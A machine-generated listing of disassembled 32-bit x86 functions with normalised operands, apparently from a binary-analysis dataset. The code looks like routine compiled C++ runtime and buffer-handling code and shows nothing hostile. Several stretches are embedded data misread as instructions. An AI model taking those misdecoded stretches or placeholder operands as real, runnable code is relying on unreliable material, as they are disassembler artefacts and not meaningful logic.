mov [ edx ] eax
sub_4b89ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov eax ecx
cdq
add eax [ ebp + 0x10 ]
adc edx [ ebp + 0x14 ]
push edx
push eax
mov eax [ ebp - 0x4 ]
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
cmp [ ebx + 0x50 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x18 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x18 ]
mov [ esi ] ecx
mov ecx [ ebp - 0x14 ]
mov [ esi + 0x4 ] ecx
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov eax esi
mov edx [ rw-data ]
mov [ esi + 0xc ] edx
jmp r-xdata
push ebx
call sub_4b6afc
pop ecx
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x4 ]
push ecx
mov eax [ ebx + 0x50 ]
push eax
call sub_4c6c90
add esp 0x8
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
je r-xdata
cmp [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x4 ]
push ecx
mov eax [ ebx + 0x50 ]
push eax
call sub_4c69a0
add esp 0x8
test eax eax
je r-xdata
push 0x1
mov eax [ ebp - 0xc ]
push eax
mov edx [ ebx + 0x50 ]
push edx
call sub_4c6b8c
add esp 0xc
test eax eax
jne r-xdata
mov edx [ ebp + 0x1c ]
mov [ ebx + 0x48 ] edx
lea ecx [ ebx + 0x44 ]
mov eax [ ebx + 0x24 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ ebx + 0x48 ]
mov [ esi ] 0x0
mov eax esi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edi
lea ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x45 ]
mov [ ebp - 0x10 ] ecx
mov eax edx
mov ecx [ ebx + 0x14 ]
mov edi [ ebp - 0x10 ]
mov [ ecx ] edi
mov ecx [ ebx + 0x24 ]
mov [ ecx ] edx
mov edx [ ebx + 0x34 ]
mov [ edx ] eax
sub_4b8abc
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebx + 0x50 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push edx
test eax eax
jne r-xdata
pop esi
pop ebx
pop ebp
retn
xor edx edx
test edx edx
jne r-xdata
push 0x1
mov ecx [ ebx + 0x50 ]
push ecx
push ebx
call sub_4b64e8
add esp 0xc
mov eax ebx
mov edx 0x2
jmp r-xdata
push edx
push eax
push esi
call sub_4c8280
add esp 0x10
test eax eax
je r-xdata
sub_4b8b0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x50 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0xffffffff
push ebx
mov eax [ ebx ]
call [ eax + 0xc ]
add esp 0x8
mov esi eax
mov edi 0xffffffff
cmp esi edi
sete dl
and edx 0x1
test dl dl
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ ebx + 0x50 ]
push ecx
call sub_4c6910
pop ecx
test eax eax
jl r-xdata
or eax 0xffffffff
sub_4b8b54
push ebp
mov ebp esp
add esp 0xfffffe84
mov eax rw-data
push ebx
push esi
push edi
lea ebx [ ebp - 0x38 ]
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp + 0xc ]
xor ecx ecx
mov [ ebp - 0xc0 ] edx
mov [ ebp - 0xac ] 0x18
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc8 ] eax
mov edx [ ebp - 0xc8 ]
push edx
mov ecx [ ebp - 0xc0 ]
push ecx
call sub_4b9c80
add esp 0x8
mov [ ebp - 0xcc ] eax
cmp [ ebp - 0xcc ] 0x0
jne r-xdata
mov [ ebp - 0xac ] 0x24
xor ecx ecx
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc [ ebp - 0xa0 ]
mov edx [ rw-data ]
mov [ ebp - 0xc4 ] edx
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ ebp - 0xcc ]
push edx
dec [ ebp - 0xa0 ]
cmp [ ebp - 0x4 ] 0x1
je r-xdata
cmp [ ebp - 0xc4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0xc ] 0x3
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
lea edx [ ebp - 0xc4 ]
test edx edx
je r-xdata
mov eax [ ebp - 0xc4 ]
mov [ ebp - 0xcc ] eax
jmp r-xdata
dec [ ebp - 0xa0 ]
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc [ rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] edx
inc [ ebp - 0xa0 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov [ esi + 0x40 ] ebx
lea ecx [ esi + 0xc ]
mov [ esi + 0x14 ] ecx
lea eax [ esi + 0x10 ]
mov [ esi + 0x18 ] eax
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
lea ecx [ esi + 0x20 ]
mov [ esi + 0x28 ] ecx
lea eax [ esi + 0x2c ]
mov [ esi + 0x34 ] eax
lea edx [ esi + 0x30 ]
mov [ esi + 0x38 ] edx
mov ecx [ esi + 0x18 ]
xor eax eax
mov [ ecx ] eax
mov edx [ esi + 0x28 ]
xor ecx ecx
mov [ edx ] ecx
mov eax [ esi + 0x38 ]
xor edx edx
mov [ eax ] edx
mov ecx [ esi + 0x14 ]
xor eax eax
mov [ ecx ] eax
mov edx [ esi + 0x24 ]
xor ecx ecx
mov [ edx ] ecx
mov eax [ esi + 0x34 ]
xor edx edx
mov [ eax ] edx
xor edx edx
mov [ esi + 0x40 ] edx
jmp r-xdata
pop eax
mov [ ebp - 0xac ] 0xc
mov ebx eax
push ebx
call sub_4b93ac
pop ecx
test al al
je r-xdata
mov eax 0x1
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0xc4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0xc ] 0x3
jne r-xdata
mov ecx [ ebp - 0xbc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc4 ]
mov [ ebp - 0xcc ] ecx
mov eax [ ebp - 0xc4 ]
mov edx [ ebp - 0xc4 ]
mov [ ebp - 0x17c ] edx
mov [ rw-data ] eax
mov ecx [ ebp - 0x17c ]
add ecx 0x4
push ecx
call sub_4c3b78
pop ecx
mov eax [ ebp - 0x17c ]
push eax
call sub_4ba37c
pop ecx
lea edx [ ebp - 0xbc ]
push edx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
lea ecx [ ebp - 0x8 ]
push ecx
call sub_4088ac
pop ecx
mov eax rw-data
inc [ ebp - 0xa0 ]
mov [ ebp - 0x8 ] eax
inc [ ebp - 0xa0 ]
lea edx [ ebp - 0x8 ]
push edx
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
push 0x8
call sub_4bbbac
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
mov [ ebp - 0xac ] 0x18
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xac ] 0x54
mov edx [ ebp - 0xc0 ]
mov ecx [ edx + 0x8 ]
add ecx 0x18
mov [ ebp - 0xd4 ] ecx
mov eax [ ebp - 0xd4 ]
add eax 0x8
push eax
lea edx [ ebp - 0xdc ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0xdc ]
push ecx
lea eax [ ebx + 0x8 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xdd ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx 0xf
mov [ ebx + 0x24 ] ecx
mov [ ebp - 0x171 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx [ ebx + 0x10 ]
mov [ ebp - 0x16c ] ecx
mov eax [ ebp - 0x16c ]
mov [ ebp - 0x170 ] eax
mov edx [ ebp - 0x170 ]
push edx
call sub_4b0180
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0xd4 ]
mov ecx [ edx + 0x20 ]
mov [ ebp - 0xe8 ] ecx
cmp [ ebp - 0xe8 ] 0xffffffff
jbe r-xdata
push ebx
call sub_4bc8cc
pop ecx
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xe4 ] ecx
mov edx [ ebp - 0xe4 ]
mov cl [ ebp - 0xdd ]
mov [ edx ] cl
mov eax [ ebp - 0xd4 ]
cmp [ eax + 0x20 ] 0x0
jae r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x178 ] eax
mov eax [ ebp - 0x178 ]
mov cl [ ebp - 0x171 ]
mov [ eax ] cl
mov [ ebp - 0xac ] 0x18
cmp ebx [ ebp - 0xd4 ]
jne r-xdata
mov [ ebp - 0xe8 ] 0xffffffff
mov edi [ ebp - 0xe8 ]
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x130 ] eax
cmp [ ebp - 0x130 ] 0x1
ja r-xdata
mov [ ebp - 0xec ] 0xffffffff
mov eax [ ebp - 0xe8 ]
mov [ ebp - 0xf0 ] eax
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0xf0 ]
jae r-xdata
mov edx [ ebp - 0x130 ]
dec edx
mov edx 0x1
jmp r-xdata
mov ecx [ ebx + 0x20 ]
sub ecx [ ebp - 0xf0 ]
cmp ecx [ ebp - 0xec ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
cmp edi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edi edx
jbe r-xdata
cmp [ ebp - 0xec ] 0x0
jbe r-xdata
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0xf0 ]
mov [ ebp - 0xec ] eax
test edi edi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push edi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x110 ] eax
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0xf0 ]
sub edx [ ebp - 0xec ]
mov [ ebp - 0xf4 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x149 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x110 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
inc [ ebp - 0xa0 ]
push ebx
inc [ ebp - 0xa0 ]
lea eax [ ebp - 0x98 ]
push eax
call sub_4bab6c
add [ ebp - 0xa0 ] 0x4
mov [ ebp - 0xd0 ] eax
mov edx rw-data
mov ecx [ ebp - 0x10 ]
add esp 0x8
mov [ ecx ] edx
xor edx edx
mov eax [ ebp - 0x10 ]
mov ecx rw-data
mov [ eax + 0x4 ] edx
mov edx rw-data
inc [ ebp - 0xa0 ]
mov eax [ ebp - 0x10 ]
mov [ eax ] ecx
inc [ ebp - 0xa0 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx ] edx
add [ ebp - 0xa0 ] 0xfffffffe
mov [ ebp - 0xac ] 0x3c
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov edx [ ebp - 0xe8 ]
mov [ ebp - 0x154 ] edx
mov ecx [ ebp - 0xd4 ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x110 ] 0x0
jbe r-xdata
mov ecx [ ebx + 0x20 ]
mov [ ebp - 0x110 ] ecx
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0xf0 ]
add ecx [ ebp - 0xec ]
mov [ ebp - 0xf8 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebp - 0xc4 ] eax
sub [ ebp - 0xa0 ] 0x4
push 0x2
lea edx [ ebp - 0x98 ]
push edx
call sub_4bb8e4
add esp 0x8
dec [ ebp - 0xa0 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0xd4 ]
add edx 0x10
mov eax [ ebp - 0xd4 ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x150 ] eax
mov eax [ ebp - 0x150 ]
mov cl [ ebp - 0x149 ]
mov [ eax ] cl
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x110 ]
mov [ ebp - 0x114 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add eax [ ebp - 0xf0 ]
mov [ ebp - 0xfc ] eax
mov edx [ ebp - 0xf4 ]
push edx
mov ecx [ ebp - 0xf8 ]
push ecx
mov eax [ ebp - 0xfc ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0xec ]
mov [ ebp - 0x100 ] edx
mov ecx [ ebp - 0x100 ]
mov [ ebp - 0x104 ] ecx
mov [ ebp - 0x105 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x158 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x104 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x10c ] eax
mov eax [ ebp - 0x10c ]
mov cl [ ebp - 0x105 ]
mov [ eax ] cl
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x15c ] eax
mov edx [ ebp - 0x154 ]
push edx
mov ecx [ ebp - 0x158 ]
push ecx
mov eax [ ebp - 0x15c ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0xe8 ]
mov [ ebp - 0x160 ] edx
mov [ ebp - 0x161 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx [ ebp - 0x110 ]
mov [ ebp - 0x118 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0x160 ]
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x168 ] ecx
mov edx [ ebp - 0x168 ]
mov cl [ ebp - 0x161 ]
mov [ edx ] cl
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x11c ] eax
mov edx [ ebp - 0x114 ]
push edx
mov ecx [ ebp - 0x118 ]
push ecx
mov eax [ ebp - 0x11c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x110 ]
mov [ ebp - 0x120 ] edx
mov ecx [ ebp - 0x120 ]
mov [ ebp - 0x124 ] ecx
mov [ ebp - 0x125 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x124 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x12c ] eax
mov eax [ ebp - 0x12c ]
mov cl [ ebp - 0x125 ]
mov [ eax ] cl
jmp r-xdata
sub_4b93ac
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
push ebx
mov edx [ ebx ]
call [ edx + 0x4 ]
pop ecx
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_4b93d8
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
sbb [ ebp + 0x7473004b ] dl
cmp bh [ fs : edx ]
arpl [ edi + 0x64 ] bp
arpl [ gs : esi + 0x74 ] si
cmp al 0x63
push 0x632c7261
push 0x692c7261
outsb
je r-xdata
arpl [ esi + 0x74 ] si
and [ edx ] ch
add [ eax + 0x890 ] dl
add [ ebx ] al
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi ] dh
add [ eax ] al
inc esp
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x6c ] ah
dec ebx
add [ ecx ] al
add [ eax ] bl
jae r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
dec [ ebp - 0x8 ]
test [ ebp + 0xc ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
pop edi
bound esp [ ecx + 0x73 ]
add [ gs : eax ] al
add [ esp + esi + 0x4b ] ah
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp bh [ fs : edx ]
arpl [ edi + 0x64 ] bp
arpl [ gs : esi + 0x74 ] si
mov eax [ ebp + 0x8 ]
push eax
call sub_4b0180
pop ecx
sub_4b961c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov ebx edx
sub ebx eax
cmp ecx ebx
jb r-xdata
mov eax ecx
pop ebx
pop ebp
retn
mov ecx edx
sub ecx eax
sub_4b963c
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
add al 0x94
dec ebx
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
arpl [ edi + 0x64 ] bp
arpl [ gs : esi + 0x74 ] si
pop edi
bound esp [ ecx + 0x73 ]
and [ gs : edx ] ch
add [ eax + 0x4e38643d ] al
add [ eax ] al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ rw-data ] edx
mov [ rw-data ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
mov [ rw-data ] ecx
mov [ rw-data ] 0x1
retn
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_4b96bc
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
push 0x0
push rw-data
call sub_4b0264
add esp 0x8
mov [ rw-data ] 0x0
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
push 0x0
push rw-data
call sub_4b0264
add esp 0x8
mov [ rw-data ] 0x0
sub_4b9748
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
mov edx [ rw-data ]
mov [ ebp - 0x2c ] edx
mov edx [ rw-data ]
mov [ ebp - 0x28 ] edx
mov ecx [ ebx + 0x58 ]
mov [ ebp - 0x2c ] ecx
mov eax [ ebx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x14 ] 0xc
mov edx [ ebp - 0x2c ]
mov [ esi ] edx
mov edx [ ebp - 0x28 ]
mov [ esi + 0x4 ] edx
mov eax esi
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4b97a4
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
mov edx [ ebp + 0x8 ]
push edx
call sub_4088ac
pop ecx
inc [ ebp - 0x8 ]
mov ecx rw-data
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_4b9874
add al 0x0
add [ eax ] al
adc [ eax ] al
or al 0x0
aam 0x66
dec ebx
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
pop edi
dec esp
outsd
arpl [ ecx + 0x6e ] bp
outsw
and [ edx ] ch
add [ eax + eax ] al
add [ eax ] al
nop
add [ eax + eax ] cl
in al 0x97
dec ebx
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
bound esp [ ecx + 0x64 ]
pop edi
popad
insb
insb
outsd
arpl [ eax ] sp
sub al [ eax ]
nop
nop
nop
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
dec [ ebp - 0x8 ]
push 0x0
push ebx
call sub_4b0264
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
push ebx
call sub_4b0180
pop ecx
sub_4b9980
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
push eax
call sub_4c3b24
pop ecx
cmp eax 0x3
jne r-xdata
push eax
call sub_4c3b58
pop ecx
cmp eax 0x3
jne r-xdata
inc [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x18
push rw-data
call sub_4b9b88
pop ecx
dec [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4b99e8
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
inc [ ebp - 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ rw-data ] edx
mov [ rw-data ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
mov [ rw-data ] ecx
mov [ rw-data ] 0x1
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_4b9a58
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
dec [ ebp - 0x8 ]
push 0x2
push rw-data
call sub_4b2f24
add esp 0x8
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4b9a88
push ebp
mov ebp esp
add esp 0xffffffd0
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x20 ] 0xc
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
push eax
call sub_4c3b24
pop ecx
cmp eax 0x3
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
inc [ ebp - 0x14 ]
mov [ ebp - 0x20 ] 0x18
jmp r-xdata
mov ebx eax
mov [ ebp - 0x20 ] 0x18
mov eax [ ebx ]
mov [ rw-data ] eax
test ebx ebx
je r-xdata
dec [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
mov esi [ ebx + 0x4 ]
lea edx [ esi + 0x4 ]
push edx
call sub_4c3b88
pop ecx
mov edi eax
test edi edi
je r-xdata
push eax
call sub_4c3b58
pop ecx
cmp eax 0x3
jne r-xdata
mov [ ebp - 0xc ] esi
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x20 ] 0x18
mov edx [ ebp - 0x30 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x20 ] 0x24
push ebx
call sub_4b0180
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x20 ] 0x48
push 0x3
mov ecx [ ebp - 0xc ]
push ecx
mov eax [ ecx ]
call [ eax ]
mov [ ebp - 0x20 ] 0x30
add esp 0x8
sub_4b9b88
push ebp
mov ebp esp
add esp 0xffffffd4
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov edx [ ebp + 0x8 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebx + 0x4 ]
push eax
call sub_4c3b88
pop ecx
mov edi eax
test edi edi
jne r-xdata
xor esi esi
mov esi ebx
jmp r-xdata
mov eax [ esi ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1c ] 0x24
push 0x3
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ edx ]
call [ ecx ]
mov [ ebp - 0x1c ] 0xc
add esp 0x8
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
sub_4b9bf8
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ rw-data ] edx
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
mov [ rw-data ] 0x1
push sub_4b9980
call sub_4c3908
pop ecx
sub_4b9c3c
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
call sub_4b9ccc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
call sub_4b9bf0
add eax 0x4
push eax
call sub_4c3b78
pop ecx
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_4b9c80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
cmp ebx [ edx + 0xc ]
jae r-xdata
xor edx edx
mov ecx [ eax + 0x8 ]
mov edx [ ecx + 0x8 ]
mov edx [ edx + ebx * 4 ]
jmp r-xdata
mov eax edx
pop ebx
pop ebp
retn
mov eax [ eax + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
test edx edx
jne r-xdata
call sub_4b9bf0
cmp ebx [ eax + 0xc ]
jae r-xdata
xor ecx ecx
mov edx [ eax + 0x8 ]
mov ecx [ edx + ebx * 4 ]
jmp r-xdata
mov eax ecx
pop ebx
pop ebp
retn
sub_4b9ccc
push ebp
mov ebp esp
add esp 0xffffff08
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
call sub_4b9bf0
mov esi eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x30 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x20 ] 0xc
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
push eax
call sub_4c3b24
pop ecx
cmp eax 0x3
jne r-xdata
dec [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
push 0x40
call sub_4bbbac
pop ecx
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
inc [ ebp - 0x14 ]
mov [ ebp - 0x20 ] 0x18
call sub_4b9bf0
mov esi eax
test esi esi
jne r-xdata
push eax
call sub_4c3b58
pop ecx
cmp eax 0x3
jne r-xdata
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x20 ] 0x3c
push 0x0
mov edx [ ebp - 0x8 ]
push edx
call sub_4ba414
